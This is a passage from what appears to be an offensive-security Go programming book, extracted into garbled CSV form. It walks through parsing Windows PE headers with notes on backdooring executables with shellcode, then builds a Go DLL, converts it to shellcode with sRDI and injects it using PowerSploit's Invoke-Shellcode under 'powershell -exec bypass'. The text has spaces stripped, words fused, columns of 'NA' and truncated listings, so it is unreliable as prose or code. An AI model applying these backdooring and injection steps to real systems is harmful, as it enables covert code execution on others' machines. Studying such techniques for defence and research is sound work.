struct.Recallthatwecreated,pefile,NA
earlier,NA,NA
whenwecalled,pe.Newfile(),NA
.,NA,NA
TheGodocumentationdefines,typeFileHeader,NA
withthestruct,NA,NA
definedin,NA,NA
Listing12-17,NA,NA
.Thisstructalignsquitewellwith,NA,NA
Microsoft’sdocumentedPECOFFFileHeaderformat,NA,NA
(definedat,NA,NA
https://docs.microsoft.com/en-,NA,NA
us/windows/win32/debug/pe-format#coff-file-header-object-,NA,NA
and-image/,NA,NA
).,"typeFileHeaderstruct{
  
  
 Machineuint16
  
  
 NumberOfSectionsuint16
  
  
 TimeDateStampuint32
  
  
 PointerToSymbolTableuint32
  
  
 NumberOfSymbolsuint32
  
  
 SizeOfOptionalHeaderuint16
  
  
 Characteristicsuint16
  
  
 }
  
 Listing12-17:TheGoPEpackage’snativePEFileHeaderstruct",NA
Thesingleitemtonoteinthisstructoutsideofthe,Machine,NA
"value(inotherwords,thePEtargetsystemarchitecture),isthe",NA,NA
property.Thispropertycontainsthenumberof,NA,NA
"sectionsdefinedwithintheSectionTable,whichimmediately ",NA,NA
followstheheaders.You’llneedtoupdatethe,NumberOfSections,NA
valueifyouintendtobackdooraPEfilebyaddinganew ,NA,NA
"section.However,otherstrategiesmaynotrequireupdating ",NA,NA
"thisvalue,suchassearchingotherexecutablesections(suchas ",CODE,NA
",",.text,NA
",andsoon)forcontiguousunused",0x00,NA
or,0xCC,NA
values(amethodtolocatesectionsofmemorythatyoucan ,NA,NA
"usetoimplantshellcode),asthenumberofsectionsremain ",NA,NA
unchanged.,NA,NA
"Inclosing,youcanusethefollowingprintstatementsto ",NA,NA
outputsomeofthemoreinterestingCOFFFileHeadervalues ,NA,NA
(,NA,NA
Listing12-18,NA,NA
).,"//PrintFileHeader
  
 fmt.Println(""[-----COFFFileHeader-----]"") 
  
 fmt.Printf(""[+]MachineArchitecture:%#x\n"",pefile.FileHeader.Machine) 
 fmt.Printf(""[+]NumberofSections:%#x\n"", 
  
 pefile.FileHeader.NumberOfSections) 
  
 fmt.Printf(""[+]SizeofOptionalHeader:%#x\n"", 
  
 pefile.FileHeader.SizeOfOptionalHeader) 
  
 //Printsectionnames
  
 fmt.Println(""[-----SectionOffsets-----]"") 
  
 fmt.Printf(""[+]NumberofSectionsFieldOffset:%#x\n"",pe_sig_offset+6)❶//thi
 sistheendoftheSignatureheader(0x7c)+coff(20bytes)+oh32
  
 (224bytes) 
  
 fmt.Printf(""[+]SectionTableOffset:%#x\n"",pe_sig_offset+0xF8)
  
 /*OUTPUT
  
 [-----COFFFileHeader-----]
  
 [+]MachineArchitecture:0x14c❷
  
 [+]NumberofSections:0x8❸
  
 [+]SizeofOptionalHeader:0xe0❹
  
 [-----SectionOffsets-----]
  
 [+]NumberofSectionsFieldOffset:0x15e❺[+
 ]SectionTableOffset:0x250❻",NA
Youcanlocatethe,NumberOfSections,NA
valuebycalculatingthe,NA,NA
"offsetofthePEsignature+4bytes+2bytes—inotherwords, ",NA,NA
"byadding6bytes.Inourcode,wealreadydefined","pe_sig_offset,",NA
sowe’djustadd6bytestothatvalue❶.We’lldiscuss ,NA,NA
sectionsinmoredetailwhenweexaminetheSectionTable ,NA,NA
structure.,NA,NA
Theproducedoutputdescribesthe,MachineArchitecture,NA
❷valueof,0x14c,NA
:an,IMAGE_FILE_MACHINE_I386,NA
asdetailedin,NA,NA
https://docs.microsoft.com/en-,NA,NA
us/windows/win32/debug/pe-format#machine-,NA,NA
types,NA,NA
.Thenumberofsections❸is,0x8,NA
", ",NA,NA
dictatingthateightentriesexistwithintheSectionTable.The ,NA,NA
OptionalHeader(whichwillbediscussednext)hasavariable ,NA,NA
lengthdependingonarchitecture:thevalueis,0xe0,NA
(224in ,NA,NA
"decimal),whichcorrespondstoa32-bitsystem❹.Thelast ",NA,NA
twosectionscanbeconsideredmoreofconvenienceoutput. ,NA,NA
"Specifically,the",SectionsFieldOffset,NA
❺providestheoffsettothe ,NA,NA
"numberofsections,whilethe",SectionTableOffset,NA
❻providesthe ,NA,NA
offsetforthelocationoftheSectionTable.Bothoffsetvalues ,NA,NA
"wouldrequiremodificationifaddingshellcode,forexample.",NA,NA
ParsingtheOptionalHeader,NA,NA
ThenextheaderinthePEfilestructureisthe,NA,NA
Optional ,NA,NA
Header,NA,NA
.AnexecutablebinaryimagewillhaveanOptional ,NA,NA
"Headerthatprovidesimportantdatatotheloader,whichloads ",NA,NA
theexecutableintovirtualmemory.Alotofdataiscontained ,NA,NA
"withinthisheader,sowe’llcoveronlyafewitemsinorderto",NA,NA
getyouusedtonavigatingthisstructure.,NA,NA
"Togetstarted,weneedtoperformabinaryreadofthe ",NA,NA
"relevantbytelengthbasedonarchitecture,asdescribedin ",NA,NA
Listing12-19,NA,NA
".Ifyouwerewritingmorecomprehensivecode, ",NA,NA
"you’dwanttocheckarchitectures(forexample,",x86,NA
versus,x86_64,NA
)throughoutinordertousetheappropriatePEdata,NA,NA
structures.,"//GetsizeofOptionalHeader
  
 ❶varsizeofOptionalHeader32=uint16(binary.Size(pe.OptionalHeader32{
 }))❷varsizeofOptionalHeader64=uint16(binary.Size(pe.OptionalHeader6
 4{}))❸varoh32pe.OptionalHeader32
  
 ❹varoh64pe.OptionalHeader64
  
  
 //ReadOptionalHeader
  
 switchpefile.FileHeader.SizeOfOptionalHeader{
  
 casesizeofOptionalHeader32:
  
  
 ❺binary.Read(sr,binary.LittleEndian,&oh32
 ) casesizeofOptionalHeader64:
  
 binary.Read(sr,binary.LittleEndian,&oh64)
  
 }
  
 Listing12-19:ReadingtheOptionalHeaderbytes(
 /ch-12/peParser/main.go
 )",NA
"Inthiscodeblock,we’reinitializingtwovariables, ",sizeOfOptionalHeader32,NA
❶and,sizeOfOptionalHeader64,NA
"❷,with224 ",NA,NA
"bytesand240bytes,respectively.Thisisan",x86,NA
"binary,so",NA,NA
we’llusetheformervariableinourcode.Immediately ,NA,NA
followingthevariabledeclarationsareinitializationsof ,pe.OptionalHeader32,NA
❸and,pe.OptionalHeader64,NA
"❹interfaces,which ",NA,NA
willcontainthe,OptionalHeader,NA
"data.Finally,weperformthe ",NA,NA
binaryread❺andmarshalittotherelevantdatastructure:the ,oh32,NA
basedona32-bitbinary.,NA,NA
Let’sdescribesomeofthemorenotableitemsofthe,NA,NA
OptionalHeader.Thecorrespondingprintstatementsand,NA,NA
subsequentoutputareprovidedin,NA,NA
Listing12-20,NA,NA
.,"//PrintOptionalHeader
  
 fmt.Println(""[-----OptionalHeader-----]"") 
  
 fmt.Printf(""[+]EntryPoint:%#x\n"",oh32.AddressOfEntryPoint) 
  
 fmt.Printf(""[+]ImageBase:%#x\n"",oh32.ImageBase) 
  
 fmt.Printf(""[+]SizeofImage:%#x\n"",oh32.SizeOfImage) 
  
 fmt.Printf(""[+]SectionsAlignment:%#x\n"",oh32.SectionAlignment) 
 fmt.Printf(""[+]FileAlignment:%#x\n"",oh32.FileAlignment) 
  
 fmt.Printf(""[+]Characteristics:%#x\n"",pefile.FileHeader.Characteristics) 
 fmt.Printf(""[+]SizeofHeaders:%#x\n"",oh32.SizeOfHeaders) 
  
 fmt.Printf(""[+]Checksum:%#x\n"",oh32.CheckSum) 
  
 fmt.Printf(""[+]Machine:%#x\n"",pefile.FileHeader.Machine) 
  
 fmt.Printf(""[+]Subsystem:%#x\n"",oh32.Subsystem) 
  
 fmt.Printf(""[+]DLLCharacteristics:%#x\n"",oh32.DllCharacteristics) 
 /*OUTPUT
  
 [-----OptionalHeader-----]
  
 [+]EntryPoint:0x169e682❶
  
 [+]ImageBase:0x400000❷
  
 [+]SizeofImage:0x3172000❸
  
 [+]SectionsAlignment:0x1000❹
  
 [+]FileAlignment:0x200❺
  
 [+]Characteristics:0x102
  
 [+]SizeofHeaders:0x400 
  
 [+]Checksum:0x2e41078 
  
 [+]Machine:0x14c 
  
 [+]Subsystem:0x2 
  
 [+]DLLCharacteristics:0x8140
  
 */
  
 Listing12-20:WritingOptionalHeadervaluestoterminaloutput(
 /ch-
 12/peParser/main.go
 )",NA
"AssumingthattheobjectiveistobackdooraPEfile,you’ll ",NA,NA
needtoknowboththe,ImageBase,NA
❷and,EntryPoint,NA
❶inorderto ,NA,NA
hijackandmemoryjumptothelocationoftheshellcodeorto ,NA,NA
anewsectiondefinedbythenumberof,SectionTable,NA
entries.The,NA,NA
istheaddressofthefirstbyteoftheimageonceitis,NA,NA
"loadedintomemory,whereasthe",EntryPoint,NA
istheaddressofthe ,NA,NA
executablecoderelativetothe,ImageBase,NA
.The,SizeofImage,NA
❸is ,NA,NA
"theactualsizeoftheimage,initsentirety,whenloadedinto ",NA,NA
memory.Thisvaluewillneedtobeadjustedtoaccommodate ,NA,NA
"anyincreaseinimagesize,whichcouldhappenifyouaddeda ",NA,NA
newsectioncontainingshellcode.,NA,NA
The,SectionsAlignment,NA
❹willprovidethebytealignment ,NA,NA
whensectionsareloadedintomemory:,0x1000,NA
isarather ,NA,NA
standardvalue.The,FileAlignment,NA
❺providesthebyte ,NA,NA
alignmentofthesectionsonrawdisk:,0x200(512K),NA
isalsoa,NA,NA
commonvalue.You’llneedtomodifythesevaluesinorderto ,NA,NA
"getworkingcode,andyou’llhavetouseahexeditoranda ",NA,NA
debuggerifyou’replanningtoperformallthismanually.,NA,NA
TheOptionalHeadercontainsnumerousentries.Insteadof ,NA,NA
"describingeverysingleoneofthem,werecommendthatyou ",NA,NA
explorethedocumentationat,NA,NA
https://docs.microsoft.com/en-,NA,NA
us/windows/win32/debug/pe-format#optional-header-,NA,NA
windows-specific-fields-image-only,NA,NA
togainacomprehensive ,NA,NA
understandingofeachentry.,NA,NA
ParsingtheDataDirectory,NA,NA
"Atruntime,theWindowsexecutablemustknowimportant ",NA,NA
"information,suchashowtoconsumealinkedDLLorhowto ",NA,NA
allowotherapplicationprocessestoconsumeresourcesthat ,NA,NA
theexecutablehastooffer.Thebinaryalsoneedstomanage ,NA,NA
"granulardata,suchasthreadstorage.Thisistheprimary ",NA,NA
functionoftheDataDirectory.,NA,NA
The,NA,NA
DataDirectory,NA,NA
isthelast128bytesoftheOptional ,NA,NA
Headerandpertainsspecificallytoabinaryimage.Weuseit,NA,NA
tomaintainatableofreferencescontainingbothanindividual ,NA,NA
directory’soffsetaddresstothedatalocationandthesizeof ,NA,NA
thedata.Exactly16directoryentriesaredefinedwithinthe ,NA,NA
WINNT.H,NA,NA
"header,whichisacoreWindowsheaderfilethat ",NA,NA
definesvariousdatatypesandconstantstobeusedthroughout ,NA,NA
theWindowsoperatingsystem.,NA,NA
"Notethatnotallofthedirectoriesareinuse,assomeare ",NA,NA
reservedorunimplementedbyMicrosoft.Theentirelistof ,NA,NA
datadirectoriesanddetailsoftheirintendedusecanbe ,NA,NA
referencedat,NA,NA
https://docs.microsoft.com/en-,NA,NA
us/windows/win32/debug/pe-format#optional-header-,NA,NA
data-directories-image-only,NA,NA
".Again,alotofinformationis ",NA,NA
"associatedwitheachindividualdirectory,sowerecommen",NA,NA
d youtakesometimetoreallyresearchandgetfamiliarwith ,NA,NA
theirstructures.,NA,NA
Let’sexploreacoupleofdirectoryentrieswithintheData ,NA,NA
Directorybyusingthecodein,NA,NA
Listing12-21,NA,NA
.,"//PrintDataDirectory
  
  
 fmt.Println(""[-----DataDirectory-----]"") 
  
 varwinnt_datadirs=[]string{❶
  
 ""IMAGE_DIRECTORY_ENTRY_EXPORT"",
  
 ""IMAGE_DIRECTORY_ENTRY_IMPORT"", 
  
 ""IMAGE_DIRECTORY_ENTRY_RESOURCE"", 
  
 ""IMAGE_DIRECTORY_ENTRY_EXCEPTION"", 
 ""IMAGE_DIRECTORY_ENTRY_SECURITY"", 
  
 ""IMAGE_DIRECTORY_ENTRY_BASERELOC"", 
 ""IMAGE_DIRECTORY_ENTRY_DEBUG"", 
  
 ""IMAGE_DIRECTORY_ENTRY_COPYRIGHT"", 
 ""IMAGE_DIRECTORY_ENTRY_GLOBALPTR"", 
 ""IMAGE_DIRECTORY_ENTRY_TLS"", 
  
 ""IMAGE_DIRECTORY_ENTRY_LOAD_CONFIG"", 
 ""IMAGE_DIRECTORY_ENTRY_BOUND_IMPORT"", 
 ""IMAGE_DIRECTORY_ENTRY_IAT"",
  
 ""IMAGE_DIRECTORY_ENTRY_DELAY_IMPORT"",",NA
TheDataDirectorylist❶isstaticallydefinedby ,NA,NA
"Microsoft,meaningthattheliteralindividualdirectoryname",NA,NA
"s willremaininaconsistentlyorderedlist.Assuch,theyare ",NA,NA
"consideredtobeconstants.Wewilluseaslicevariable, ",winnt_datadirs,NA
",tostoretheindividualdirectoryentriessowecan",NA,NA
"reconcilenamestoindexpositions.Specifically,theGoPE ",NA,NA
"packageimplementstheDataDirectoryasastructobject,so ",NA,NA
we’rerequiredtoiterateovereachentrytoextractthe ,NA,NA
"individualdirectoryentries,alongwiththeirrespectiveaddre",NA,NA
ss offsetandsizeattributes.The,for,NA
"loopis0-indexbased,sowe ",NA,NA
justoutputeachsliceentryrelativetoitsindexposition❷. ,NA,NA
Thedirectoryentriesbeingdisplayedtostandardoutputar,NA,NA
e the,IMAGE_DIRECTORY_ENTRY_EXPORT,NA
"❸,ortheEAT,andthe ",IMAGE_DIRECTORY_ENTRY_IMPORT,NA
"❻,ortheIAT.Eachofthese",NA,NA
directoriesmaintainsatableofexportedandimported ,NA,NA
"functions,respectively,relativetotherunningWindows ",NA,NA
executable.Lookingfurtherat ,IMAGE_DIRECTORY_ENTRY_EXPORT,NA
",youwillseethevirtual ",NA,NA
"address❹containingtheoffsetoftheactualtabledata,along ",NA,NA
withthesize❺ofthedatacontainedwithin.,NA,NA
ParsingtheSectionTable,NA,NA
The,NA,NA
SectionTable,NA,NA
",thelastPEbytestructure,immediately ",NA,NA
followstheOptionalHeader.Itcontainsthedetailsofeach ,NA,NA
"relevantsectionintheWindowsexecutablebinary,suchas ",NA,NA
executablecodeandinitializeddatalocationoffsets.The ,NA,NA
numberofentriesmatchesthe,NumberOfSections,NA
definedwithi,NA,NA
n,NA,NA
theCOFFFileHeader.YoucanlocatetheSectionTableatthe ,NA,NA
PEsignatureoffset+,0xF8,NA
.Let’stakealookatthissection,NA,NA
withinahexeditor(,NA,NA
Figure12-8,NA,NA
).,NA,NA
ThisparticularSectionTablestartswith,.text,NA
",butitmight ",NA,NA
startwitha,CODE,NA
"section,dependingonthebinary’scompiler.",NA,NA
The,.text,NA
(or,CODE,NA
")sectioncontainstheexecutablecode, ",NA,NA
"whereasthenextsection,",.rodata,NA
",containsread-onlyconstant ",NA,NA
data.The,.rdata,NA
"sectioncontainsresourcedata,andthe",.data,NA
sectioncontainsinitializeddata.Eachsectionisatleast40 ,NA,NA
bytesinlength.,NA,NA
YoucanaccesstheSectionTablewithintheCOFFFile ,NA,NA
"Header.Youcanalsoaccesseachsectionindividually,using ",NA,NA
thecodein,NA,NA
Listing12-22,NA,NA
.,"s:=pefile.Section("".text"")",NA
"TheotheroptionistoiterateovertheentireSectionTable, ",NA,NA
asshownin,NA,NA
Listing12-23,NA,NA
.,"fmt.Println(""[-----SectionTable-----]"") 
 for_,section:=rangepefile.Sections{❶fmt.P
 rintln(""[+]--------------------"")
  
 fmt.Printf(""[+]SectionName:%s\n"",section.Name) 
  
 fmt.Printf(""[+]SectionCharacteristics:%#x\n"",section.Characteristics) 
 fmt.Printf(""[+]SectionVirtualSize:%#x\n"",section.VirtualSize) 
 fmt.Printf(""[+]SectionVirtualOffset:%#x\n"",section.VirtualAddress) 
 fmt.Printf(""[+]SectionRawSize:%#x\n"",section.Size) 
  
 fmt.Printf(""[+]SectionRawOffsettoData:%#x\n"",section.Offset) 
 fmt.Printf(""[+]SectionAppendOffset(NextSection):%#x\n"", 
  
 section.Offset+section.Size) 
  
 }
  
 /*OUTPUT 
  
 [-----SectionTable-----]
  
 [+]--------------------
  
 [+]SectionName:.text❷
  
 [+]SectionCharacteristics:0x60000020❸
  
 [+]SectionVirtualSize:0x1853dd0❹
  
 [+]SectionVirtualOffset:0x1000❺
  
 [+]SectionRawSize:0x1853e00❻
  
 [+]SectionRawOffsettoData:0x400❼
  
 [+]SectionAppendOffset(NextSection):0x1854200❽
  
 [+]--------------------
  
 [+]SectionName:.rodata 
  
 [+]SectionCharacteristics:0x6000002
 0 
  
 [+]SectionVirtualSize:0x1b00
  
 [+]SectionVirtualOffset:0x1855000",NA
"Here,we’reiteratingoverallthesectionswithinthe ",NA,NA
SectionTable❶andwritingthe,name,NA
"❷,",virtualsize,NA
"❹,","virtual 
 address",NA
"❺,",rawsize,NA
"❻,and",rawoffset,NA
"❼tostandardoutput.Also, ",NA,NA
wecalculatethenext40-byteoffsetaddress❽intheevent ,NA,NA
thatwe’dwanttoappendanewsection.The,characteristics,NA
value,NA,NA
❸describeshowthesectionistobehaveaspartofthebinary. ,NA,NA
"Forexample,the",.text,NA
sectionprovidesavalueof0x60000020.,NA,NA
Referencingtherelevant,SectionFlags,NA
dataat,NA,NA
https://docs.microsoft.com/en-us/windows/win32/debug/pe-,NA,NA
format#section-flags,NA,NA
(,NA,NA
Table12-2,NA,NA
"),wecanseethatthree",NA,NA
separateattributesmakeupthevalue.,"Table12-2:
 CharacteristicsofSectionFlags
  
  
 Flag
  
 Value
  
 Description
  
  
  
 IMAGE_SCN_CNT
  
 0x00000020
  
 Thesectioncontainsexecutablecode.
  
 _CODE
  
  
 IMAGE_SCN_MEM
  
 0x20000000
  
 Thesectioncanbeexecutedascode.
  
 _EXECUTE
  
  
 IMAGE_SCN_MEM
  
 0x40000000
  
 Thesectioncanberead.
  
 _READ",NA
"Thefirstvalue,0x00000020(",IMAGE_SCN_CNT_CODE,NA
"),states",NA,NA
"thatthesectioncontainsexecutablecode.Thesecondvalue,",NA,NA
0x20000000(,IMAGE_SCN_MEM_EXECUTE,NA
"),statesthatthesection",NA,NA
"canbeexecutedascode.Lastly,thethirdvalue,0x40000000 ",NA,NA
(,IMAGE_SCN_MEM_READ,NA
"),allowsthesectiontoberead.",NA,NA
"Therefore,addingallthesetogetherprovidesthevalue ",NA,NA
"0x60000020.Ifyou’readdinganewsection,keepinmindthat ",NA,NA
you’llneedtoupdateallthesepropertieswiththeirappropriat,NA,NA
e values.,NA,NA
ThiswrapsupourdiscussionofthePEfiledatastructure.,NA,NA
"Itwasabriefoverview,weknow.Eachsectioncouldbeits ",NA,NA
"ownchapter.However,itshouldbeenoughtoallowyouto ",NA,NA
useGoasameanstonavigatearbitrarydatastructures.The ,NA,NA
PEdatastructureisquiteinvolvedandit’swellworththetime ,NA,NA
andeffortnecessarytobecomefamiliarwithallofits ,NA,NA
components.,NA,NA
AdditionalExercises,NA,NA
TaketheknowledgeyoujustlearnedaboutthePEfiledata ,NA,NA
structureandexpanduponit.Herearesomeadditionalideas ,NA,NA
"thatwillhelpreinforceyourunderstanding,whilealso ",NA,NA
providingachancetoexploremoreoftheGoPEpackage:,"ObtainvariousWindowsbinariesanduseahexeditorandadebuggertoexplore 
  
 thevariousoffsetvalues.Identifyhowvariousbinariesaredifferent,suchas 
  
 theirnumberofsections.Usetheparserthatyoubuiltinthischaptertoboth 
  
 exploreandverifyyourmanualobservations.
  
  
 ExplorenewareasofthePEfilestructure,suchastheEATandIAT.Now, 
  
 rebuildtheparsertosupportDLLnavigation.
  
  
 AddanewsectiontoanexistingPEfiletoincludeyourshinynewshellcode.
  
 Updatetheentiresectiontoincludetheappropriatenumberofsections,entry 
 point,andrawandvirtualvalues.Dothisalloveragain,butthistime,insteadof 
 addinganewsection,useanexistingsectionandcreateacodecave.
  
  
 Onetopicthatwedidn’tdiscusswashowtohandlePEfilesthathavebeencode 
  
 packed,eitherwithcommonpackers,suchasUPX,ormoreobscurepackers.",NA
USINGCWITHGO,NA,NA
AnothermethodofaccessingtheWindowsAPIistoleverage ,NA,NA
"C.BydirectlyusingC,youcouldtakeadvantageofan ",NA,NA
"existinglibrarythatisavailableonlyinC,createaDLL ",NA,NA
"(whichwecan’tdousingGoalone),orsimplycallthe ",NA,NA
"WindowsAPI.Inthissection,we’llfirstinstallandconfigure ",NA,NA
aCtoolchainthatiscompatiblewithGo.Wewillthenlookat ,NA,NA
examplesofhowtouseCcodeinGoprogramsandhowto ,NA,NA
includeGocodeinCprograms.,NA,NA
InstallingaCWindowsToolchain,NA,NA
"TocompileprogramsthatcontainacombinationofGoandC, ",NA,NA
you’llneedasuitableCtoolchainthatcanbeusedtobuild ,NA,NA
"portionsofCcode.OnLinuxandmacOS,youcaninstallthe ",NA,NA
GNUCompilerCollection(GCC)byusingapackage ,NA,NA
"manager.OnWindows,installingandconfiguringatoolchain ",NA,NA
isabitmoreinvolvedandcanleadtofrustrationifyou’renot ,NA,NA
familiarwiththemanyoptionsavailable.Thebestoptionwe ,NA,NA
"foundistouseMSYS2,whichpackagesMinGW-w64,a ",NA,NA
projectcreatedtosupporttheGCCtoolchainonWindows.,NA,NA
Downloadandinstallthisfrom,NA,NA
https://www.msys2.org,NA,NA
/,NA,NA
and ,NA,NA
followtheinstructionsonthatpagetoinstallyourCtoolchain.,NA,NA
"Also,remembertoaddthecompilertoyour",PATH,NA
variable.,NA,NA
CreatingaMessageBoxUsingCandtheWindows ,NA,NA
API,NA,NA
"NowthatwehaveaCtoolchainconfiguredandinstalled,let’s",NA,NA
lookatasimpleGoprogramthatleveragesembeddedCcode. ,NA,NA
Listing12-24,NA,NA
containsCthatusestheWindowsAPItocreate ,NA,NA
"amessagebox,whichgivesusavisualdisplayofthe ",NA,NA
WindowsAPIinuse.,"packagemain
  
  
 ❶/* 
  
 #include<stdio.h>
  
  
 #include<windows.h>
  
  
 ❷voidbox() 
  
 {
  
 MessageBox(0,""IsGothebest?"",""CGOGO"",0x00000004L); }
  
 */
  
 ❸import""C"" 
  
 funcmain(){
  
  
  
 ❹C.box() 
  
 }
  
 Listing12-24:GousingC(
 /ch-12/messagebox/main.go
 )",NA
Ccodecanbeprovidedthroughexternalfile,include,NA
statements❶.ItcanalsobeembeddeddirectlyinaGofile. ,NA,NA
Hereweareusingbothmethods.ToembedCcodeintoaGo ,NA,NA
"file,weuseacomment,insideofwhichwedefineafunction ",NA,NA
thatwillcreatea,MessageBox,NA
❷.Gosupportscommentsfor ,NA,NA
"manycompile-timeoptions,includingcompilingCcode. ",NA,NA
"Immediatelyaftertheclosingcommenttag,weuse","import""C""",NA
to,NA,NA
"telltheGocompilertouseCGO,apackagethatallowstheGo ",NA,NA
compilertolinknativeCcodeatbuildtime❸.WithintheGo ,NA,NA
"code,wecannowcallfunctionsdefinedinC,andwecallthe ",C.box(),NA
"function,whichexecutesthefunctiondefinedinthe",NA,NA
bodyofourCcode❹.,NA,NA
Buildthesamplecodebyusing,gobuild,NA
".Whenexecuted,",NA,NA
youshouldgetamessagebox.,"NOTE
  
 ThoughtheCGOpackageisextremelyconvenient,allowingyoutocallC 
 librariesfromGocodeaswellascallGolibrariesfromCcode,usingit gets rid of 
 Go’s memory manager and garbage disposal. If you want to 
 reapthebenefitsofGo’smemorymanager,youshouldallocatememory 
 withinGoandthenpassittoC.Otherwise,Go’smemorymanagerwon’t 
 knowaboutallocationsyou’vemadeusingtheCmemorymanager,and 
 thoseallocationswon’tbefreedunlessyoucallC’snative
 free()
 method.Not 
 freeingthememorycorrectlycanhaveadverseeffectsonyourGocode. 
 Finally,justlikeopeningfilehandlesinGo,use
 defer
 withinyourGofunction 
 toensurethatanyCmemorythatGoreferencesisgarbagecollected.",NA
BuildingGointoC,NA,NA
"JustaswecanembedCcodeintoGoprograms,wecanembed ",NA,NA
"GocodeintoCprograms.Thisisusefulbecause,asofthis ",NA,NA
"writing,theGocompilercan’tbuildourprogramsintoDLLs.",NA,NA
Thatmeanswecan’tbuildutilitiessuchasreflectiveDLL ,NA,NA
injectionpayloads(liketheonewecreatedearlierinthis ,NA,NA
chapter)withGoalone.,NA,NA
"However,wecanbuildourGocodeintoaCarchivefile, ",NA,NA
andthenuseCtobuildthearchivefileintoaDLL.Inthis ,NA,NA
"section,we’llbuildaDLLbyconvertingourGocodeintoaC ",NA,NA
archivefile.Thenwe’llconvertthatDLLintoshellcodeby ,NA,NA
"usingexistingtools,sowecaninjectandexecuteitin ",NA,NA
memory.Let’sstartwiththeGocode(,NA,NA
Listing12-25,NA,NA
"),savedin",NA,NA
afilecalled,NA,NA
main.go,NA,NA
.,NA,NA
"WeimportCtoincludeCGOintoourbuild❶.Next,we ",NA,NA
useacommenttotellGothatwewanttoexportafunctionin ,NA,NA
"ourCarchive❷.Finally,wedefinethefunctionwewantto ",NA,NA
convertintoC❸.The,main(),NA
function❹canremainempty.,NA,NA
"TobuildtheCarchive,executethefollowingcommand:",">
 gobuild-buildmode=c-archive",NA
"Weshouldnowhavetwofiles,anarchivefilecalled ",NA,NA
dllshellcode.a,NA,NA
andanassociatedheaderfilecalled ,NA,NA
dllshellcode.h,NA,NA
.Wecan’tusethesequiteyet.Wehavetobuild ,NA,NA
ashiminCandforcethecompilertoinclude,NA,NA
dllshellcode.a,NA,NA
.,NA,NA
Oneelegantsolutionistouseafunctiontable.Createafile ,NA,NA
thatcontainsthecodein,NA,NA
Listing12-26,NA,NA
.Callthisfile,NA,NA
scratch.c,NA,NA
.,"#include""dllshellcode.h""
  
  
 void(*table[1])={Start};
  
 Listing12-26:Afunctiontablesavedinthe
 scratch.c
 file(
 /ch-
 12/dllshellcode/scratch.c
 )",NA
WecannowuseGCCtobuildthe,NA,NA
scratch.c,NA,NA
Cfileintoa ,NA,NA
DLLbyusingthefollowingcommand:,">
 gcc-shared-pthread-ox.dllscratch.cdllshellcode.a-lWinMM-lntdll-
  
  
 lWS2_32",NA
"ToconvertourDLLintoshellcode,we’llusesRDI ",NA,NA
(,NA,NA
https://github.com/monoxgas/sRDI/,NA,NA
"),anexcellentutilityth",NA,NA
"at hasatonoffunctionality.Tobegin,downloadtherepoby ",NA,NA
"usingGitonWindowsand,optionally,aGNU/Linuxmachine, ",NA,NA
asyoumayfindGNU/Linuxtobeamorereadilyavailable ,NA,NA
"Python3environment.You’llneedPython3forthisexercise, ",NA,NA
soinstallitifit’snotalreadyinstalled.,NA,NA
Fromthe,NA,NA
sRDI,NA,NA
"directory,executea",python3,NA
shell.Usethe,NA,NA
followingcodetogenerateahashoftheexportedfunction:,">>>
 fromShellCodeRDIimport*
  
  
 >>>
 HashFunctionName('Start')
  
  
 1168596138",NA
ThesRDItoolswillusethehashtoidentifyafunctionfrom ,NA,NA
theshellcodewe’llgeneratelater.,NA,NA
"Next,we’llleveragePowerShellutilitiestogenerateand ",NA,NA
"executeshellcode.Forconvenience,wewillusesomeutilities ",NA,NA
fromPowerSploit ,NA,NA
(,NA,NA
https://github.com/PowerShellMafia/PowerSploit,NA,NA
/),NA,NA
",which",NA,NA
is asuiteofPowerShellutilitieswecanleveragetoinject ,NA,NA
shellcode.YoucandownloadthisusingGit.Fromthe ,NA,NA
PowerSploit\CodeExecution,NA,NA
"directory,launchanew ",NA,NA
PowerShellshell:,"c:\tools\PowerSploit\CodeExecution>
 powershell.exe-execbypass
  
  
 WindowsPowerShell
  
  
 Copyright(C)2016MicrosoftCorporation.Allrightsreserved.",NA
NowimporttwoPowerShellmodulesfromPowerSploit ,NA,NA
andsRDI:,"PSC:\tools\PowerSploit\CodeExecution>
 Import-Module.\Invoke-
 Shellcode.ps1",NA
"Withbothmodulesimported,wecanuse",ConvertTo-Shellcode,NA
"fromsRDItogenerateshellcodefromtheDLL,andthenpass ",NA,NA
thisinto,Invoke-Shellcode,NA
fromPowerSploittodemonstratethe,NA,NA
"injection.Oncethisexecutes,youshouldobserveyourGo ",NA,NA
codeexecuting:,"PSC:\tools\sRDI\PowerShell>
 Invoke-Shellcode-Shellcode(ConvertTo-
  
  
 Shellcode
  
  
 -FileC:�sers\tom\Downloads\x.dll-FunctionHash1168596138)
  
  
 InjectingshellcodeintotherunningPowerShellprocess!
  
  
 Doyouwishtocarryoutyourevilplans?
  
  
 [Y]Yes[N]No[S]Suspend[?]Help(defaultis""Y""):Y
  
  
 YOFROMGO",NA
Themessage,YOFROMGo,NA
indicatesthatwehave,NA,NA
successfullylaunchedourGopayloadfromwithinaCbinary ,NA,NA
thatwasconvertedintoshellcode.Thisunlocksawholehost ,NA,NA
ofpossibilities.,NA,NA
SUMMARY,NA,NA
"Thatwasquitealottodiscuss,andyetitjustscratchesthe ",NA,NA
surface.Westartedthechapterwithabriefdiscussionabout ,NA,NA
navigatingtheWindowsAPIdocumentationsoyou’dbe ,NA,NA
familiarwithreconcilingWindowsobjectstousableGo ,NA,NA
"objects:theseincludefunctions,parameters,datatypes,and ",NA,NA
"returnvalues.Next,wediscussedtheuseof",uintptr,NA
and,unsafe.Pointer,NA
toperformdisparatetypeconversionsnecessary,NA,NA
wheninteractingwiththeGo,syscall,NA
"package,alongwiththe",NA,NA
potentialpitfallstoavoid.Wethentiedeverythingtogether ,NA,NA
"withademonstrationofprocessinjection,whichusedvariou",NA,NA
s GosystemcallstointeractwithWindowsprocessinternals.,NA,NA
"Fromthere,wediscussedthePEfileformatstructure,and ",NA,NA
thenbuiltaparsertonavigatethedifferentfilestructures.We ,NA,NA
demonstratedvariousGoobjectsthatmakenavigatingthe ,NA,NA
binaryPEfileabitmoreconvenientandfinishedupwith ,NA,NA
notableoffsetsthatmaybeinterestingwhenbackdooringaPE ,NA,NA
file.,NA,NA
"Lastly,youbuiltatoolchaintointeroperatewithGoand ",NA,NA
nativeCcode.WebrieflydiscussedtheCGOpackagewhile ,NA,NA
focusingoncreatingCcodeexamplesandexploringnovel ,NA,NA
toolsforcreatingnativeGoDLLs.,NA,NA
Takethischapterandexpandonwhatyou’velearned.We ,NA,NA
"urgeyoutocontinuouslybuild,break,andresearchthemany ",NA,NA
